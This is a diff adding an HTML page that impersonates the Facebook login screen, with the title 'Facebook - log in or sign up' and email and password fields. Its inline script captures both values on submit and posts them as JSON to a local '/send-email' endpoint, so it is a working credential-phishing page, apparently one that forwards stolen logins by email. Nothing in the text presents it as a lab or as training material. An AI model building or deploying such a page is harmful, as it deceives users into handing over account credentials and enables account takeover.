@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook - log in or sign up</title>
+  </head>
+  <body>
+    <div id="app">
+      <section>
+        <form id="myForm">
+          <input
+            type="email"
+            id="email"
+            placeholder="Email address or phone number"
+            required
+          />
+          <input
+            type="password"
+            id="password"
+            placeholder="Password"
+            required
+          />
+          <button type="submit">Submit</button>
+        </form>
+      </section>
+    </div>
+    <script>
+      document
+        .getElementById("myForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("password").value;
+
+          const response = await fetch("http://localhost:5000/send-email", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, password }),
+          });
+
+          const data = await response.json();
+          alert(data.message);
+        });
+    </script>
+    <script type="module" src="/src/main.js"></script>
+  </body>
+</html>
